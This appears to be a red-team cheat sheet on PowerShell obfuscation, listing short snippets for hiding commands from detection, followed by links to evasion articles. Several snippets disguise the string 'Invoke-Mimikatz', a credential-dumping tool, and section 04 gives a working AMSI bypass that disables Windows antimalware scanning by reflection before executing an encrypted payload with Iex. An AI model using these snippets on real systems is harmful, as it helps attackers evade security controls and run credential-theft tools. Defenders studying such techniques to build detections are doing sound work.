---
author(s):
  - Userware
tags: []
---
# PowerShell

## 01 - String Concatenation

```
PS C:\> "Invoke-" + "Mimikatz"
```

## 02 - Insert Comments

```
PS C:\> "Invoke-" <#inserting comment#> + "Mimikatz"
```

## 03 - Abstract Syntax Tree (AST)

```
PS C:\> Get-Command -name ("{1}{2}{0}{3}" -f "-Proces", "G", "et", "s")

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Get-Process                                        7.0.0.0    Microsoft.PowerShell.Management
```

## 04 - Encrypted Strings

```
$secureString = ConvertTo-SecureString -String '<payload>' -AsPlainText -force
$encoded = ConvertFrom-SecureString -k (0..15) $secureString > output.txt

$encoded = <encoded payload>
$Ref = [REF].Assembly.GetType('System.Management.Automation.AmsiUtils’);
$Ref.GetField(‘AmsiInitFailed','NonPublic,Static’).SetValue($null, $true);
$credential = [System.Management.Automation.PSCredential]::new("tim",(ConvertTo-SecureString -k (0..15)
$encoded))
Iex $credential.GetNetworkCredential().Password
```

## 05 - Reverse Strings

```powershell
function ReverseString($inputString) {
	$charArray = $inputString.ToCharArray()
	$reversedArray = $charArray[-1..-($charArray.Length)]
	$reversedString = -join $reversedArray
	return $reversedString
}

Write-Output ReverseString("Reversed String.")
```

---
## References

### Daniel Bohannon

- [Daniel Bohannon: PowerShell Execution Argument Obfuscation (& How It Can Make Detection Easier!)](https://www.slideshare.net/slideshow/invokeobfuscation-derbycon-2016/66405101)

### Huebicode

- [huebicode: Powershell Obfuscation](https://huebicode.com/blog/powershell-obfuscation.html)

### t3l3machus

- [t3l3machus: Powershell Obfuscation Bible](https://github.com/t3l3machus/PowerShell-Obfuscation-Bible)

### gh0x0st

- [gh0x0st: Layer 0 Obfuscation](https://github.com/gh0x0st/Invoke-PSObfuscation/blob/main/layer-0-obfuscation.md)

### r00t 3xp10it

- [r00t-3xp10it: Simple Obfuscation](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md)

### Bordergate

- [Bordergate: Obfuscating Command Line Arguments](https://www.bordergate.co.uk/obfuscating-command-line-arguments/)

### Onlyf8

- [onlyf8: Powershell and Obfuscation](https://onlyf8.com/powershell-obfuscationEN)

### Offensive Security

- [Offensive Security: PowerShell Obfuscation](https://www.offensive-security.com/offsec/powershell-obfuscation/)

### klezvirus

- [klezvirus: Chameleon Born From a Chimera](https://klezvirus.github.io/RedTeaming/AV_Evasion/BornFromAChimera/)

### Jorge Lajara

- [Jorge Lajara: Powershell AV Evasion. Running Mimikatz with PowerLine](https://jlajara.gitlab.io/Mimikatz-AV-Evasion)

### geoda

- [geoda: Running an Obfuscated version of Mimikatz in Memory to bypass AntiVirus and other host based controls](https://blog.geoda-security.com/2018/05/running-obfuscated-version-of-mimikatz.html)

### Digital Whisper

- [Digital Whisper: Fileless Attacks Part 2](https://www.digitalwhisper.co.il/files/Zines/0x8E/DW142-1-FilelessAttacks_Part2.pdf)

### CTFIoT

- [CTFIoT: Bypassing Windows Defender](https://www.ctfiot.com/112423.html)

### Dennis Chow

- [Dennis Chow: Fun with PowerShell Payload Execution and Evasion](https://medium.com/swlh/fun-with-powershell-payload-execution-and-evasion-f5051fd149b2)

### Hacking Articles

- [Hacking Articles: A Detailed Guide on AMSI Bypass](https://www.hackingarticles.in/a-detailed-guide-on-amsi-bypass/)

### Debugging AMSI Function

- [Winslow Blog: Bypass AMSI On Windows 11](https://winslow1984.com/books/red-team/page/bypass-amsi-on-windows-11)

### Wietze Beukema

- [Wietze Beukema: PowerShell Obfuscation using `SecureString`](https://www.wietzebeukema.nl/blog/powershell-obfuscation-using-securestring)